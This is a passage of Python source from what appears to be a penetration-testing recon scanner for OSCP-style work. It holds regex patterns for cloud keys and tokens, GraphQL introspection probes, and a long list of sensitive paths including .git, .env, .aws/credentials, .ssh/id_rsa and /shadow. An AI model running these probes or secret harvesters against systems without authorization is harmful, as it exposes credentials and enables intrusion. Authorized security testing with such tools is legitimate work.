        # Extract user-defined type names
        type_names = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]+)"', body)
        # Filter GraphQL built-ins (__Schema, __Type, etc.)
        user_types = [t for t in type_names if not t.startswith("__")]
        # Deduplicate while preserving order
        seen: Set[str] = set()
        unique_types = [t for t in user_types if not (t in seen or seen.add(t))]  # type: ignore[func-returns-value]
        return {
            "path":    path,
            "types":   unique_types[:30],
            "enabled": True,
        }
    return None


# NOTE: suggest_nuclei_templates() was intentionally removed.
# Nuclei is a mass vulnerability scanner (performs similar functions to Nessus/OpenVAS)
# and is therefore prohibited on the OSCP+ exam under the "mass vulnerability scanners"
# restriction plus the "any tools that perform similar functions" clause.
# Reference: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
# Use searchsploit + manual curl probes for CVE research instead.

def extract_cookies(resp: bytes) -> List[Dict[str, str]]:
    """Extract Set-Cookie headers and flag missing security attributes."""
    cookies: List[Dict[str, str]] = []
    hdrs = http_headers(resp)
    # http_headers only gets the last value per key, so reparse for multiple Set-Cookie
    try:
        head_b, _ = split_http_bytes(resp)
        head = safe_decode(head_b)
        for line in head.splitlines():
            if line.lower().startswith("set-cookie:"):
                val = line.split(":", 1)[1].strip()
                name = val.split("=")[0].strip() if "=" in val else val[:30]
                flags: List[str] = []
                val_lower = val.lower()
                if "httponly" not in val_lower:
                    flags.append("missing HttpOnly")
                if "secure" not in val_lower:
                    flags.append("missing Secure")
                if "samesite" not in val_lower:
                    flags.append("missing SameSite")
                cookies.append({"name": name, "value": val[:200], "flags": ", ".join(flags)})
    except Exception:
        pass
    return cookies[:10]

def extract_forms(body: str, base_url: str) -> List[Dict[str, str]]:
    """Find HTML forms - login forms, upload forms, etc."""
    forms: List[Dict[str, str]] = []
    for m in re.finditer(r'(?is)<form\b([^>]*)>(.*?)</form>', body or ""):
        attrs = m.group(1)
        inner = m.group(2)
        action = ""
        method = "GET"
        am = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
        if am:
            action = am.group(1)
        mm = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
        if mm:
            method = mm.group(1).upper()
        # Find input fields
        inputs = re.findall(r'(?is)<input\b[^>]*name=["\']([^"\']*)["\'][^>]*/?\s*>', inner)
        # Check for file upload
        has_upload = bool(re.search(r'type=["\']file["\']', inner, re.I))
        # Check for password field
        has_password = bool(re.search(r'type=["\']password["\']', inner, re.I))

        form_info = {
            "action": action or "(self)",
            "method": method,
            "inputs": ", ".join(inputs[:10]),
            "has_upload": has_upload,
            "has_password": has_password,
        }
        forms.append(form_info)
        if len(forms) >= 8:
            break
    return forms

def scan_js_for_secrets(assets: List[str], host: str, port: int, use_ssl: bool) -> List[Dict[str, str]]:
    """
    Fetch JS files and scan for API keys, tokens, passwords, cloud credentials, endpoints.

    Pattern set expanded to cover:
      - AWS (AKIA…), Azure, GCP keys
      - GitHub / GitLab / Bitbucket tokens
      - Slack / Discord / Stripe tokens
      - PEM private keys
      - DB connection strings
      - Generic high-entropy secrets (base64 / hex blobs assigned to key-like variables)
    """
    secrets: List[Dict[str, str]] = []
    SECRET_PATTERNS = [
        # ---- Cloud provider keys ----
        (r'\b(AKIA[0-9A-Z]{16})\b',                                       "AWS AccessKeyId"),
        (r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*["\']([^"\']{20,80})["\']', "AWS SecretKey"),
        (r'(?i)azure[_-]?(?:client_?secret|subscription[_-]?id|tenant[_-]?id)\s*[:=]\s*["\']([^"\']{10,80})["\']', "Azure Credential"),
        (r'"type"\s*:\s*"service_account"',                                "GCP Service Account JSON"),
        # ---- Token formats ----
        (r'\b(ghp_[A-Za-z0-9]{36})\b',                                    "GitHub PAT (ghp_)"),
        (r'\b(gho_[A-Za-z0-9]{36})\b',                                    "GitHub OAuth (gho_)"),
        (r'\b(gha_[A-Za-z0-9]{36})\b',                                    "GitHub Actions token"),
        (r'\b(glpat-[A-Za-z0-9\-_]{20})\b',                               "GitLab PAT"),
        (r'\b(xox[pboarsc]-[0-9A-Za-z\-]{10,100})\b',                     "Slack token"),
        (r'\b(sk_live_[A-Za-z0-9]{20,80})\b',                             "Stripe Live Key"),
        (r'\b(rk_live_[A-Za-z0-9]{20,80})\b',                             "Stripe Restricted Key"),
        (r'\b(discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-\.]{40,100})\b', "Discord Webhook"),
        # ---- Generic / common variable patterns ----
        (r'(?i)(?:api[_-]?key|apikey|api_secret|client[_-]?secret)\s*[:=]\s*["\']([^"\']{8,80})["\']', "API Key"),
        (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{3,80})["\']', "Hardcoded Password"),
        (r'(?i)(?:bearer|access_token|auth_token|authorization)\s*[:=]\s*["\']([^"\']{8,120})["\']', "Bearer/Auth Token"),
        (r'(?i)(?:private_key|privatekey|private-key)\s*[:=]\s*["\']([^"\']{16,120})["\']', "Private Key Value"),
        # ---- Private key headers ----
        (r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',             "PEM Private Key"),
        # ---- Connection strings ----
        (r'(?i)(?:mysql|postgres|mongodb|redis|mssql|sqlserver)://[^\s"\'<>]{10,120}', "DB Connection String"),
        (r'(?i)(?:Data Source|Server)\s*=\s*[^\s;]{3,};\s*(?:Initial Catalog|Database)\s*=', "SQL Connection String"),
        # ---- Sensitive endpoints buried in JS ----
        (r'(?i)/api/v[0-9]+/[a-z_\-/]{5,60}',                            "API Endpoint"),
        (r'(?i)/(?:internal|private|admin|debug|secret)/[a-z_\-/]{3,40}', "Sensitive Path"),
    ]
    scanned = 0
    for url in assets[:15]:
        if scanned >= 8:
            break
        path = urlparse(url).path
        if not path.endswith(".js"):
            continue
        scanned += 1
        resp = http_request_raw(host, port, path, use_ssl, method="GET", timeout=2.0, max_bytes=120000)
        if not resp:
            continue
        body = http_body_text(resp)
        for pat, label in SECRET_PATTERNS:
            for m in re.finditer(pat, body):
                # Prefer captured group 1 if available, else whole match
                val = (m.group(1) if m.lastindex and m.group(1) else m.group(0))[:120]
                # Skip obvious placeholders
                if val.lower() in ("your_api_key", "your_secret", "xxx", "placeholder", "<key>", "changeme"):
                    continue
                secrets.append({"type": label, "value": val, "source": path})
                if len(secrets) >= 30:
                    return secrets
    return secrets[:30]

def check_http_redirects(host: str, port: int, use_ssl: bool) -> Optional[str]:
    """Follow HTTP redirects and return final destination URL if different."""
    resp = http_request_raw(host, port, "/", use_ssl, method="GET", timeout=2.0, max_bytes=8000)
    if not resp:
        return None
    code = http_status_code(resp)
    if code in ("301", "302", "307", "308"):
        hdrs = http_headers(resp)
        location = hdrs.get("Location", "") or hdrs.get("location", "")
        if location:
            return location
    return None

def check_http_redirects_vhost(host: str, port: int, use_ssl: bool, vhost: str) -> Optional[str]:
    """Follow HTTP redirects with a specific Host header. Returns redirect location if any."""
    resp = http_request_raw(host, port, "/", use_ssl, method="GET", timeout=2.0, max_bytes=8000,
                           headers={"Host": vhost})
    if not resp:
        return None
    code = http_status_code(resp)
    if code in ("301", "302", "307", "308"):
        hdrs = http_headers(resp)
        location = hdrs.get("Location", "") or hdrs.get("location", "")
        if location:
            return location
    return None

def probe_graphql_introspection(host: str, port: int, use_ssl: bool,
                                 extra_headers: Optional[Dict[str, str]] = None) -> Optional[Dict[str, any]]:
    """
    Probe for a GraphQL endpoint and run an introspection query.
    Tries common endpoint paths: /graphql, /api/graphql, /v1/graphql, /query, /gql.
    Returns a dict with the endpoint path and a list of discovered type names, or None.
    """
    GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
                     "/query", "/gql", "/graphql/console", "/api/graph"]
    INTRO_QUERY = '{"query":"{__schema{types{name kind}}}"}'

    h: Dict[str, str] = {"Content-Type": "application/json"}
    if extra_headers:
        h.update(extra_headers)

    for path in GRAPHQL_PATHS:
        try:
            resp = http_request_raw(host, port, path, use_ssl, method="POST",
                                    timeout=3.0, max_bytes=32000,
                                    headers={**h, "Content-Length": str(len(INTRO_QUERY))})
            # Re-send with body: build request manually since http_request_raw doesn't support body
            # We'll send via raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            if use_ssl:
                s = make_ssl_socket(s, host)
            s.connect((host, port))
            payload = INTRO_QUERY.encode()
            req_headers = {
                "Host": host,
                "User-Agent": "Mozilla/5.0 (ncscanner/1337.codes)",
                "Content-Type": "application/json",
                "Content-Length": str(len(payload)),
                "Connection": "close",
                "Accept": "application/json",
            }
            if extra_headers:
                req_headers.update(extra_headers)
            hdr_str = "".join([f"{k}: {v}\r\n" for k, v in req_headers.items()])
            req = f"POST {path} HTTP/1.1\r\n{hdr_str}\r\n".encode() + payload
            s.send(req)
            data = b""
            s.settimeout(3.0)
            while len(data) < 32000:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            s.close()

            code = http_status_code(data)
            if code not in ("200", "201"):
                continue
            body = http_body_text(data)
            if '"__schema"' not in body and '"types"' not in body:
                continue
            # Parse type names
            type_names: List[str] = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]{2,})"', body)
            # Filter out built-in GraphQL types
            BUILTIN = {"String", "Boolean", "Int", "Float", "ID", "__Schema", "__Type",
                       "__TypeKind", "__Field", "__InputValue", "__EnumValue", "__Directive",
                       "__DirectiveLocation", "Query", "Mutation", "Subscription"}
            custom_types = [t for t in dict.fromkeys(type_names) if t not in BUILTIN][:40]
            return {"path": path, "types": custom_types, "raw_snippet": body[:500]}
        except Exception:
            continue
    return None

def fetch_allow_methods_vhost(host: str, port: int, use_ssl: bool, vhost: str) -> List[str]:
    """Fetch allowed HTTP methods with a specific Host header."""
    resp = http_request_raw(host, port, "/", use_ssl, method="OPTIONS", timeout=2.0, max_bytes=20000,
                           headers={"Host": vhost})
    if not resp:
        return []
    hdrs = http_headers(resp)
    for k, v in hdrs.items():
        if k.lower() == "allow":
            return [m.strip() for m in v.split(",") if m.strip()]
    return []

def http_analyze_vhost(ip: str, port: int, is_ssl: bool, vhost: str, web_probe_count: int,
                       whatweb_timeout: int, wafw00f_timeout: int,
                       show_robot_body: bool) -> PortResult:
    """
    Analyze HTTP service using a specific hostname (vhost) while connecting to the IP.
    This is essential for virtual host routing where different content is served based on Host header.
    """
    pr = PortResult(port=port, service_guess=COMMON_SERVICES.get(port, "Unknown"),
                    detected_service="HTTP", is_ssl=is_ssl)
    scheme = "https" if is_ssl else "http"
    pr.url = f"{scheme}://{vhost}:{port}/"

    # === Check for HTTP redirects with vhost ===
    redir = check_http_redirects_vhost(ip, port, is_ssl, vhost)
    if redir:
        pr.redirect_url = redir
        # Extract domain from redirect URL and record it
        redir_domain = extract_domain_from_url(redir)
        if redir_domain and redir_domain not in HOSTNAME_CACHE["redirects"]:
            HOSTNAME_CACHE["redirects"].add(redir_domain)
            HOSTNAME_CACHE["all"].add(redir_domain)
            record_domain(redir_domain, source=f"redirect:{port}:{vhost}")

    # Root fetch with Host header set to vhost
    root = http_request_raw(ip, port, "/", is_ssl, method="GET", timeout=2.3, max_bytes=220000,
                           headers={"Host": vhost})
    body_t = ""
    if root:
        head_b, body_b = split_http_bytes(root)
        head_t = safe_decode(head_b)
        body_t = safe_decode(body_b)

        lines = head_t.splitlines()
        pr.status_line = lines[0].strip() if lines else ""
        pr.title = extract_title(body_t)
        pr.methods = fetch_allow_methods_vhost(ip, port, is_ssl, vhost)

        hdrs = http_headers(root)
        # keep versions in headers
        for k in ("Server", "X-Powered-By", "X-Generator", "X-Jenkins", "X-AspNet-Version",
                   "X-AspNetMvc-Version", "X-Drupal-Cache", "X-Varnish", "X-Runtime"):
            if k in hdrs and hdrs[k] and hdrs[k] not in pr.tech:
                pr.tech.append(f"{k}: {hdrs[k]}")

        # body fingerprints
        body_low = body_t.lower()
        body_tech = [
            ("wp-content", "WordPress"), ("wp-includes", "WordPress"),
            ("csrfmiddlewaretoken", "Django"), ("laravel", "Laravel"),
            ("werkzeug", "Werkzeug"), ("flask", "Flask"),
            ("__viewstate", "ASP.NET"), ("jquery", "jQuery"),
            ("bootstrap", "Bootstrap"), ("webmin", "Webmin"),
        ]
        for needle, name in body_tech:
            if needle in body_low and name not in pr.tech:
                pr.tech.append(name)

        pr.users = extract_users(body_t)
        pr.emails = extract_emails(body_t)
        pr.comments = extract_comments(body_t)
        pr.dev_notes.extend(find_dev_notes(body_t, pr.url))
        pr.cookies = extract_cookies(root)
        pr.forms = extract_forms(body_t, pr.url)

    # === SSL certificate info ===
    if is_ssl:
        pr.ssl_cert_info = extract_ssl_cert_info(ip, port)
        ssl_domains = extract_domains_from_ssl_cert(pr.ssl_cert_info)
        for ssl_dom in ssl_domains:
            if ssl_dom not in HOSTNAME_CACHE["ssl_certs"]:
                HOSTNAME_CACHE["ssl_certs"].add(ssl_dom)
                HOSTNAME_CACHE["all"].add(ssl_dom)
                record_domain(ssl_dom, source=f"ssl_cert:{port}")

    # robots.txt with vhost
    robots = http_request_raw(ip, port, "/robots.txt", is_ssl, method="GET", timeout=2.0, max_bytes=90000,
                             headers={"Host": vhost})
    if robots:
        code = http_status_code(robots)
        pr.robots.status = code
        pr.robots.present = code in ("200", "301", "302", "401", "403")
        if show_robot_body and code == "200":
            pr.robots.snippet = http_body_text(robots).strip()[:12000]

    # sitemap.xml with vhost
    sm = http_request_raw(ip, port, "/sitemap.xml", is_ssl, method="GET", timeout=2.0, max_bytes=3000,
                         headers={"Host": vhost})
    if sm:
        code = http_status_code(sm)
        pr.sitemap_status = code
        pr.sitemap_present = code in ("200", "301", "302", "401", "403")
    else:
        pr.sitemap_present = False

    # WhatWeb with vhost URL
    if shutil.which("whatweb"):
        pr.whatweb_out = run_cmd(["whatweb", "-a", "3", pr.url], timeout=whatweb_timeout)
        for t in parse_whatweb_tech(pr.whatweb_out):
            if t not in pr.tech:
                pr.tech.append(t)

    # wafw00f with vhost URL
    if shutil.which("wafw00f"):
        pr.wafw00f_out = run_cmd(["wafw00f", pr.url], timeout=wafw00f_timeout)
        pr.waf_detected = parse_wafw00f(pr.wafw00f_out)

    # === Quickwin probes (CRITICAL - .git, .env, etc.) ===
    # Detect soft-404/wildcard for vhost
    is_wildcard, wc_status, wc_bodylen = detect_soft_404_vhost(ip, port, is_ssl, vhost)
    if is_wildcard:
        pr.is_wildcard_404 = True
        pr.wildcard_status = wc_status
        print(f"  {C.YELLOW}⚠ WILDCARD 404: Server returns {wc_status} for nonexistent paths!{C.END}")

    # Run probes with Host header – PARALLELISED for speed
    probe_list = WEB_PROBE_TOP[:]
    if web_probe_count > len(probe_list):
        probe_list += WEB_PROBE_CATALOG[: max(0, web_probe_count - len(probe_list))]
    probe_list = [p for p in probe_list[:web_probe_count] if p not in ("/robots.txt", "/sitemap.xml")]

    # Extra word-count baseline for enhanced wildcard filtering on this vhost
    _vwc_words = 0
    if is_wildcard:
        _vraw2 = http_request_raw(ip, port,
                                  "/" + "".join(random.choices(string.ascii_lowercase, k=14)) + ".html",
                                  is_ssl, method="GET", timeout=1.5, max_bytes=8000,
                                  headers={"Host": vhost})
        _vwc_words = len(http_body_text(_vraw2).split()) if _vraw2 else 0

    _VSENS_403 = frozenset(["/.git", "/.svn", "/.hg", "/.env", "/admin", "/manager",
                             "/server-status", "/actuator", "/console", "/.htpasswd",
                             "/WEB-INF", "/META-INF", "/backup", "/config"])

    print(f"  {C.GREY}> Probing {len(probe_list)} quickwin paths (parallel)...{C.END}", end="", flush=True)
    _vp_lock = threading.Lock()
    _vhits = 0
    _vp_results: List[WebCheck] = []
    _vp_sensitive: Dict[str, str] = {}

    def _run_vprobe(pth: str):
        nonlocal _vhits
        if shutdown_flag.is_set() or _vhits >= 30:
            return
        resp = http_request_raw(ip, port, pth, is_ssl, method="GET", timeout=1.1, max_bytes=16000,
                                headers={"Host": vhost})
        if not resp:
            return
        code = http_status_code(resp)
        if code not in ("200", "301", "302", "401", "403"):
            return
        _vsens_403 = code == "403" and any(pth.startswith(s) for s in _VSENS_403)
        if is_wildcard and code == wc_status and not _vsens_403:
            pbody = http_body_text(resp).strip()
            _sm = abs(len(pbody) - wc_bodylen) < max(50, wc_bodylen * 0.15)
            _wm = _vwc_words > 0 and abs(len(pbody.split()) - _vwc_words) < max(5, _vwc_words * 0.15)
            if _sm or _wm:
                return
        with _vp_lock:
            if _vhits >= 30:
                return
            _vp_results.append(WebCheck(path=pth, status=code, present=True))
            _vhits += 1
            if code == "200" and pth in SENSITIVE_PROBE_PATHS:
                bc = http_body_text(resp).strip()[:3000]
                if bc and len(bc) > 2:
                    _vp_sensitive[pth] = bc

    _vnw = min(20, max(5, len(probe_list) // 5 + 1))
    with cf.ThreadPoolExecutor(max_workers=_vnw) as _vpex:
        list(_vpex.map(_run_vprobe, probe_list))

    hits = _vhits
    pr.probes.extend(_vp_results)
    pr.sensitive_files.update(_vp_sensitive)
    
    print(f" {C.GREEN}{hits} hits{C.END}")

    # CMS version extraction
    pr.cms_versions = extract_cms_version(pr.title or "", body_t, pr.tech, pr.whatweb_out)

    # Auto-searchsploit
    if shutil.which("searchsploit") and pr.cms_versions:
        pr.searchsploit_results = auto_searchsploit(pr.cms_versions)

    # === GraphQL introspection probe ===
    # If we see graphql-related hits in probes or tech, fire an introspection query
    graphql_indicator = (
        any("graphql" in (x.path or "").lower() for x in pr.probes)
        or any("graphql" in t.lower() for t in pr.tech)
        or "graphql" in (body_t or "").lower()
    )
    if graphql_indicator:
        try:
            gql_result = probe_graphql_introspection(host, port, is_ssl)
            if gql_result and gql_result.get("types"):
                pr.tech.append(f"GraphQL({len(gql_result['types'])} types)")
                # Stash in js_secrets as a recon finding so it surfaces in output
                pr.js_secrets.append({
                    "type": "GraphQL Introspection",
                    "value": f"Endpoint: {gql_result['path']} | Types: {', '.join(gql_result['types'][:20])}",
                    "source": gql_result["path"],
                })
        except Exception:
            pass

    # Dedup dev notes
    if pr.dev_notes:
        seen = set()
        uniq = []
        for dn in pr.dev_notes:
            k = (dn.get("url"), dn.get("line"), dn.get("col"), dn.get("keyword"), dn.get("note"))
            if k in seen:
                continue
            seen.add(k)
            uniq.append(dn)
        pr.dev_notes = uniq[:25]

    # ── Advanced analysis (security headers, CORS, HTTP/2, JWT, open-redirect) ──
    root_for_hdrs = http_request_raw(ip, port, "/", is_ssl, method="HEAD",
                                     timeout=1.5, max_bytes=4096,
                                     headers={"Host": vhost})
    if root_for_hdrs:
        pr.security_headers = analyze_security_headers(root_for_hdrs, is_ssl)
        pr.websocket = detect_websocket(root_for_hdrs)

    pr.cors_vuln = detect_cors_reflection(ip, port, is_ssl, path="/", vhost=vhost)

    if is_ssl:
        pr.http2 = detect_http2(ip, port)

    if body_t:
        pr.jwt_tokens = detect_jwt_tokens(
            root_for_hdrs if root_for_hdrs else b"", body_t
        )

    pr.open_redirect = detect_open_redirect(ip, port, is_ssl, vhost=vhost)

    # Spring Boot Actuator probe (fast, only a few paths)
    actuator_blob = " ".join(pr.tech + list(pr.cms_versions.keys())).lower()
    if any(x in actuator_blob for x in ("spring", "java", "tomcat")) or any(
        p.path.startswith("/actuator") for p in pr.probes
    ):
        pr.actuator_paths = check_spring_actuator(ip, port, is_ssl, vhost=vhost)

    # GraphQL probe (only if not already found by path probing)
    if not any("/graphql" in p.path for p in pr.probes):
        gql = check_graphql(ip, port, is_ssl, vhost=vhost)
        if gql:
            pr.graphql_path = gql

    return pr


# --------------------------- Web probing lists ---------------------------

# HIGH PRIORITY QUICKWINS - Always checked first (OSCP-safe, high value)
WEB_PROBE_TOP = [
    # ============================================================================
    # SOURCE CODE / VERSION CONTROL EXPOSURE (Critical!)
    # Check directories FIRST (403 = exists!), then specific files
    # ============================================================================
    "/.git/",        # Directory - 403 means it exists!
    "/.git",         # Without trailing slash
    "/.svn/",        # SVN directory
    "/.svn",
    "/.hg/",         # Mercurial
    "/.bzr/",        # Bazaar
    "/CVS/",         # CVS
    "/.git/config",
    "/.git/HEAD",
    "/.git/index",
    "/.git/logs/HEAD",
    "/.gitignore",
    "/.svn/entries",
    "/.svn/wc.db",
    "/.hg/hgrc",
    "/.bzr/README",
    "/CVS/Root",
    "/CVS/Entries",
    
    # ============================================================================
    # ENVIRONMENT / CONFIG FILES (Credentials, secrets!)
    # ============================================================================
    "/.env",
    "/.env.local",
    "/.env.dev",
    "/.env.prod",
    "/.env.production",
    "/.env.staging",
    "/.env.backup",
    "/.env.bak",
    "/.env.old",
    "/.env.example",  # Sometimes has real creds
    "/env.js",
    "/config.php",
    "/config.php.bak",
    "/config.php~",
    "/config.inc.php",
    "/configuration.php",
    "/settings.php",
    "/settings.py",
    "/config.yml",
    "/config.yaml",
    "/config.json",
    "/application.yml",
    "/application.properties",
    "/appsettings.json",  # .NET
    "/web.config",  # IIS - can expose connection strings
    "/Web.config",
    "/app.config",
    
    # ============================================================================
    # ROBOTS, SITEMAP, SECURITY.TXT
    # ============================================================================
    "/robots.txt",
    "/sitemap.xml",
    "/sitemap_index.xml",
    "/sitemaps.xml",
    "/.well-known/security.txt",
    "/security.txt",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    
    # ============================================================================
    # BACKUP FILES (Common patterns - high value!)
    # ============================================================================
    "/backup.zip",
    "/backup.tar.gz",
    "/backup.sql",
    "/backup.sql.gz",
    "/backup.tar",
    "/backup.rar",
    "/site.zip",
    "/www.zip",
    "/html.zip",
    "/web.zip",
    "/htdocs.zip",
    "/db.sql",
    "/database.sql",
    "/dump.sql",
    "/data.sql",
    "/mysql.sql",
    "/.sql",
    "/1.sql",
    
    # ============================================================================
    # SERVER STATUS / INFO PAGES (Info disclosure)
    # ============================================================================
    "/server-status",
    "/server-info",
    "/.htaccess",
    "/.htpasswd",
    "/phpinfo.php",
    "/info.php",
    "/php.php",
    "/test.php",
    "/i.php",
    "/pi.php",
    "/php_info.php",
    "/_phpinfo.php",
    "/debug.php",
    "/debug/",
    "/debug/default/view",  # Yii debug
    
    # ============================================================================
    # ADMIN / LOGIN PANELS
    # ============================================================================
    "/admin/",
    "/admin",
    "/administrator/",
    "/admin.php",
    "/admin/login",
    "/admin/login.php",
    "/adminpanel/",
    "/cpanel/",
    "/manager/",
    "/manager/html",  # Tomcat
    "/host-manager/html",  # Tomcat
    "/login",
    "/login.php",
    "/login.html",
    "/signin",
    "/user/login",
    "/users/sign_in",
    "/dashboard",
    "/dashboard/",
    "/portal/",
    "/console",  # Werkzeug, H2, Rails
    "/console/",
    
    # ============================================================================
    # WORDPRESS
    # ============================================================================
    "/wp-admin/",
    "/wp-login.php",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/wp-config.php.old",
    "/wp-config.php~",
    "/wp-config.php.save",
    "/wp-config.php.swp",
    "/wp-config.bak",
    "/wp-config.txt",
    "/wp-json/",
    "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/users?per_page=100",
    "/xmlrpc.php",
    "/?author=1",
    "/wp-includes/version.php",
    "/readme.html",  # WP version
    "/license.txt",
    
    # ============================================================================
    # DRUPAL
    # ============================================================================
    "/CHANGELOG.txt",
    "/core/CHANGELOG.txt",
    "/INSTALL.txt",
    "/core/INSTALL.txt",
    "/UPDATE.txt",
    "/UPGRADE.txt",
    "/user/login",
    "/user/register",
    "/admin/content",
    "/node/1",
    "/sites/default/files/",
    "/sites/default/settings.php",
    
    # ============================================================================
    # JOOMLA
    # ============================================================================
    "/administrator/",
    "/administrator/index.php",
    "/administrator/manifests/files/joomla.xml",
    "/language/en-GB/en-GB.xml",
    "/plugins/system/cache/cache.xml",
    "/configuration.php~",
    "/configuration.php.bak",
    
    # ============================================================================
    # JAVA / TOMCAT / SPRING
    # ============================================================================
    "/WEB-INF/web.xml",
    "/WEB-INF/classes/",
    "/META-INF/MANIFEST.MF",
    "/manager/status",
    "/jmx-console/",  # JBoss
    "/web-console/",  # JBoss
    "/invoker/JMXInvokerServlet",  # JBoss RCE
    "/invoker/EJBInvokerServlet",
    "/status",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/info",
    "/actuator/mappings",
    "/actuator/configprops",
    "/actuator/heapdump",
    "/jolokia",
    "/jolokia/list",
    "/api/swagger.json",
    "/swagger.json",
    "/swagger-ui.html",
    "/swagger/",
    "/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    
    # ============================================================================
    # ASP.NET / IIS
    # ============================================================================
    "/trace.axd",
    "/elmah.axd",
    "/glimpse.axd",
    "/_vti_bin/",
    "/_vti_inf.html",
    "/_vti_log/",
    "/aspnet_client/",
    "/iisstart.htm",
    
    # ============================================================================
    # NODE.JS / EXPRESS / JAVASCRIPT FRAMEWORKS
    # ============================================================================
    "/package.json",
    "/package-lock.json",
    "/npm-debug.log",
    "/yarn.lock",
    "/node_modules/",
    "/.npmrc",
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/graphql",
    "/graphiql",
    "/playground",
    "/webpack.config.js",
    "/app.js",
    "/server.js",
    "/index.js",
    
    # ============================================================================
    # PYTHON / DJANGO / FLASK
    # ============================================================================
    "/requirements.txt",
    "/Pipfile",
    "/Pipfile.lock",
    "/pyproject.toml",
    "/.python-version",
    "/settings.py",
    "/local_settings.py",
    "/config.py",
    "/manage.py",
    "/app.py",
    "/wsgi.py",
    "/static/admin/",  # Django admin static
    "/__debug__/",  # Django debug toolbar
    
    # ============================================================================
    # RUBY / RAILS
    # ============================================================================
    "/Gemfile",
    "/Gemfile.lock",
    "/.ruby-version",
    "/config/database.yml",
    "/config/secrets.yml",
    "/config/master.key",
    "/config/credentials.yml.enc",
    "/rails/info/properties",
    
    # ============================================================================
    # PHP SPECIFIC
    # ============================================================================
    "/composer.json",
    "/composer.lock",
    "/vendor/",
    "/.php_cs",
    "/.php_cs.cache",
    "/artisan",  # Laravel
    "/.env.example",
    "/storage/logs/laravel.log",  # Laravel logs
    "/debug/default/view.html",  # Yii
    
    # ============================================================================
    # DOCKER / KUBERNETES / CLOUD
    # ============================================================================
    "/Dockerfile",
    "/docker-compose.yml",
    "/docker-compose.yaml",
    "/.dockerignore",
    "/.dockerenv",
    "/Vagrantfile",
    "/.kube/config",
    "/kubeconfig",
    "/.aws/credentials",
    "/.aws/config",
    
    # ============================================================================
    # CI/CD CONFIG (Secrets in pipelines!)
    # ============================================================================
    "/.gitlab-ci.yml",
    "/.github/workflows/",
    "/Jenkinsfile",
    "/.travis.yml",
    "/bitbucket-pipelines.yml",
    "/azure-pipelines.yml",
    "/.circleci/config.yml",
    
    # ============================================================================
    # COMMON FILES / INFO DISCLOSURE
    # ============================================================================
    "/README",
    "/README.md",
    "/README.txt",
    "/CHANGELOG",
    "/CHANGELOG.md",
    "/CHANGELOG.txt",
    "/VERSION",
    "/VERSION.txt",
    "/INSTALL",
    "/INSTALL.md",
    "/LICENSE",
    "/LICENSE.txt",
    "/RELEASE_NOTES.txt",
    "/release-notes.txt",
    "/humans.txt",
    "/TODO",
    "/TODO.txt",
    
    # ============================================================================
    # LOGS (Sensitive info!)
    # ============================================================================
    "/logs/",
    "/log/",
    "/debug.log",
    "/error.log",
    "/errors.log",
    "/access.log",
    "/error_log",
    "/debug_log",
    "/app.log",
    "/application.log",
    
    # ============================================================================
    # DATABASE FILES
    # ============================================================================
    "/db.sqlite",
    "/db.sqlite3",
    "/database.sqlite",
    "/database.db",
    "/data.db",
    "/users.db",
    "/.db",
    "/sqlite.db",
    
    # ============================================================================
    # MISC HIGH-VALUE PATHS
    # ============================================================================
    "/.DS_Store",
    "/Thumbs.db",
    "/desktop.ini",
    "/.idea/",
    "/.vscode/",
    "/cgi-bin/",
    "/cgi-bin/test-cgi",
    "/cgi-bin/printenv",
    "/fcgi-bin/",
    "/upload/",
    "/uploads/",
    "/files/",
    "/tmp/",
    "/temp/",
    "/cache/",
    "/bak/",
    "/old/",
    "/backup/",
    "/test/",
    "/dev/",
    "/staging/",
    "/internal/",
    "/private/",
    "/secret/",
    "/hidden/",
    "/.hidden/",
    "/data/",
    
    # ============================================================================
    # WEBDAV DETECTION
    # ============================================================================
    "/webdav/",
    "/dav/",
    
    # ============================================================================
    # JENKINS
    # ============================================================================
    "/script",  # Groovy console - RCE!
    "/api/json",
    "/asynchPeople/",
    "/credentials/",
    "/configureSecurity/",
    "/computer/",
    "/job/",
    
    # ============================================================================
    # OTHER CMS/APPS
    # ============================================================================
    # Grafana
    "/api/health",
    "/api/datasources",
    "/public/plugins/",
    # Kibana
    "/app/kibana",
    "/status",
    # GitLab
    "/users/sign_in",
    "/explore",
    "/-/graphql-explorer",
    # Webmin
    "/session_login.cgi",
    # phpMyAdmin
    "/phpmyadmin/",
    "/pma/",
    "/mysql/",
    "/myadmin/",
    "/phpMyAdmin/",
    # Adminer
    "/adminer.php",
    "/adminer/",

    # ── Windows / XAMPP common paths ────────────────────────────────────────
    "/xampp/",
    "/xampp/index.php",
    "/wamp/",
    "/wamp64/",
    "/htdocs/",

    # ── API endpoints ────────────────────────────────────────────────────────
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/api/v3/",
    "/rest/",
    "/rest/v1/",
    "/graphql",
    "/graphiql",
    "/playground",
    "/v1/",
    "/v2/",

    # ── Extra high-value sensitive paths ────────────────────────────────────
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/.ssh/authorized_keys",
    "/id_rsa",
    "/id_ecdsa",
    "/id_ed25519",
    "/.bash_history",
    "/.profile",
    "/shadow",                # if misconfigured web root
    "/cgi-bin/",
    "/cgi-bin/admin.cgi",
    "/cgi-bin/status",
    "/cgi-bin/printenv",      # leaks environment variables
    "/cgi-bin/test-cgi",
]

# Big catalog exists but is NOT hammered by default (see --web-probe-count).
WEB_PROBE_CATALOG = [
"/.env",
    "/.env.dev",
